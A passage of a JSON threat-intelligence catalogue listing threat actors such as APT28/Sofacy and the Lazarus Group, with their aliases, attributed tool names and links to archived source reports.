                " Small Sieve",
                " Syncro",
                " Venom Proxy",
                " WMIExec",
                "AnyDesk"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "8bc1a044-a23b-4904-903c-13f463605cb3",
            "created_at": "2024-05-01T02:03:08.136237Z",
            "updated_at": "2025-03-27T02:05:17.415795Z",
            "deleted_at": null,
            "main_name": "NICKEL GLADSTONE",
            "aliases": [
                "Bluenoroff ",
                "CTG-6459 ",
                "Citrine Sleet ",
                "HIDDEN COBRA ",
                "Lazarus Group",
                "Sapphire Sleet ",
                "Stardust Chollima ",
                "APT38 "
            ],
            "source_name": "Secureworks:NICKEL GLADSTONE",
            "tools": [
                " Bankshot",
                " CATCH22",
                " CCGC_Proxy",
                " Cur1Agent",
                " Ratankba",
                " Server_TrafficForwarder",
                " Wcry",
                "AlphaNC"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
                " LoJack",
                " Powershell Empire",
                " SCONATO",
                " SEDUPLOADER",
                " SHARPFRONT",
                " Scaramouche",
                " Sedkit Exploit Kit",
                " Sofacy downloader",
                " X-Agent",
                " X-Tunnel",
                " Zebrocy",
                " reGeorg",
                "DEALERSCHOICE"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "730dfa6e-572d-473c-9267-ea1597d1a42b",
            "created_at": "2023-01-06T13:46:38.389985Z",
            "updated_at": "2025-03-27T02:00:02.821388Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "FROZENLAKE",
                "BlueDelta",
                "SNAKEMACKEREL",
                "TG-4127",
                "ITG05",
                "TA422",
                "Fancy Bear",
                "FANCY BEAR",
                "Sednit",
                "IRON TWILIGHT",
                "G0007",
                "Sofacy",
                "Forest Blizzard",
                "GruesomeLarch",
                "Pawn Storm",
                "Tsar Team",
                "STRONTIUM",
                "ATK5",
                "Blue Athena",
                "APT-C-20",
                "Group 74",
                "SIG40",
                "Grizzly Steppe",
                "Fighting Ursa",
                "T-APT-12",
                "UAC-0028"
            ],
            "source_name": "MISPGALAXY:APT28",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a2b92056-9378-4749-926b-7e10c4500dac",
            "created_at": "2023-01-06T13:46:38.430595Z",
            "updated_at": "2025-03-27T02:00:02.831633Z",
            "deleted_at": null,
            "main_name": "Lazarus Group",
            "aliases": [
                "Operation DarkSeoul",
                "APT38",
                "ATK117",
                "DEV-1222",
                "G0032",
                "APT 38",
                "Stardust Chollima",
                "APT-C-26",
                "ATK3",
                "Diamond Sleet",
                "Hidden Cobra",
                "Unit 121",
                "Subgroup: Bluenoroff",
                "NICKEL GLADSTONE",
                "DEV-0139",
                "Andariel",
                "Operation Troy",
                "COVELLITE",
                "TA404",
                "Lazarus group",
                "Dark Seoul",
                "G0082",
                "NewRomanic Cyber Army Team",
                "Bluenoroff",
                "Appleworm",
                "Nickel Academy",
                "COPERNICIUM",
                "Hastati Group",
                "Bureau 121",
                "Operation AppleJeus",
                "Whois Hacking Team",
                "Citrine Sleet",
                "Sapphire Sleet",
                "Group 77",
                "Labyrinth Chollima",
                "Operation GhostSecret",
                "BeagleBoyz"
            ],
            "source_name": "MISPGALAXY:Lazarus Group",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "ae320ed7-9a63-42ed-944b-44ada7313495",
            "created_at": "2022-10-25T15:50:23.671663Z",
            "updated_at": "2025-03-27T02:00:55.518748Z",
            "deleted_at": null,
            "main_name": "APT28",
            "aliases": [
                "APT28",
                "IRON TWILIGHT",
                "SNAKEMACKEREL",
                "Group 74",
                "Sednit",
                "Sofacy",
                "Pawn Storm",
                "Fancy Bear",
                "STRONTIUM",
                "Tsar Team",
                "Threat Group-4127",
                "TG-4127",
                "Forest Blizzard",
                "FROZENLAKE"
            ],
            "source_name": "MITRE:APT28",
            "tools": [
                "Wevtutil",
                "certutil",
                "Forfiles",
                "DealersChoice",
                "Mimikatz",
                "ADVSTORESHELL",
                "Komplex",
                "HIDEDRV",
                "JHUHUGIT",
                "Koadic",
                "Winexe",
                "XTunnel",
                "Drovorub",
                "CORESHELL",
                "OLDBAIT",
                "Downdelph",
                "XAgentOSX",
                "USBStealer",
                "Zebrocy",
                "Fysbis",
                "LoJax"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "d2516b8e-e74f-490d-8a15-43ad6763c7ab",
            "created_at": "2022-10-25T16:07:24.212584Z",
            "updated_at": "2025-03-27T02:02:10.141001Z",
            "deleted_at": null,
            "main_name": "Sofacy",
            "aliases": [
                "APT 28",
                "ATK 5",
                "Blue Athena",
                "BlueDelta",
                "FROZENLAKE",
                "Fancy Bear",
                "Fighting Ursa",
                "Forest Blizzard",
                "Grey-Cloud",
                "Grizzly Steppe",
                "Group 74",
                "GruesomeLarch",
                "ITG05",
                "Iron Twilight",
                "Operation DealersChoice",
                "Operation Dear Joohn",
                "Operation Komplex",
                "Operation Pawn Storm",
                "Operation Russian Doll",
                "Operation Steal-It",
                "Pawn Storm",
                "SIG40",
                "Sednit",
                "Snakemackerel",
                "Sofacy",
                "Strontium",
                "T-APT-12",
                "TA422",
                "TAG-0700",
                "TAG-110",
                "TG-4127",
                "Tsar Team",
                "UAC-0028",
                "UAC-0063"
            ],
            "source_name": "ETDA:Sofacy",
            "tools": [
                "ADVSTORESHELL",
                "AZZY",
                "Backdoor.SofacyX",
                "CHERRYSPY",
                "CORESHELL",
                "Carberp",
                "Computrace",
                "DealersChoice",
                "Delphacy",
                "Downdelph",
                "Downrage",
                "Drovorub",
                "EVILTOSS",
                "Foozer",
                "GAMEFISH",
                "GooseEgg",
                "Graphite",
                "HATVIBE",
                "HIDEDRV",
                "Headlace",
                "Impacket",
                "JHUHUGIT",
                "JKEYSKW",
                "Koadic",
                "Komplex",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "LoJack",
                "LoJax",
                "MASEPIE",
                "Mimikatz",
                "NETUI",
                "Nimcy",
                "OCEANMAP",
                "OLDBAIT",
                "PocoDown",
                "PocoDownloader",
                "Popr-d30",
                "ProcDump",
                "PythocyDbg",
                "SMBExec",
                "SOURFACE",
                "SPLM",
                "STEELHOOK",
                "Sasfis",
                "Sedkit",
                "Sednit",
                "Sedreco",
                "Seduploader",
                "Shunnael",
                "SkinnyBoy",
                "Sofacy",
                "SofacyCarberp",
                "SpiderLabs Responder",
                "Trojan.Shunnael",
                "Trojan.Sofacy",
                "USB Stealer",
                "USBStealer",
                "VPNFilter",
                "Win32/USBStealer",
                "WinIDS",
                "Winexe",
                "X-Agent",
                "X-Tunnel",
                "XAPS",
                "XTunnel",
                "Xagent",
                "Zebrocy",
                "Zekapab",
                "carberplike",
                "certutil",
                "certutil.exe",
                "fysbis",
                "webhp"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536090,
    "ts_updated_at": 1743041831,
    "ts_creation_date": 1653703376,
    "ts_modification_date": 1653703376,
    "files": {
        "pdf": "https://archive.orkl.eu/2d93f2a54832388c391c70c22a7a1a9a6d3aa92d.pdf",
        "text": "https://archive.orkl.eu/2d93f2a54832388c391c70c22a7a1a9a6d3aa92d.txt",
        "img": "https://archive.orkl.eu/2d93f2a54832388c391c70c22a7a1a9a6d3aa92d.jpg"
    }
}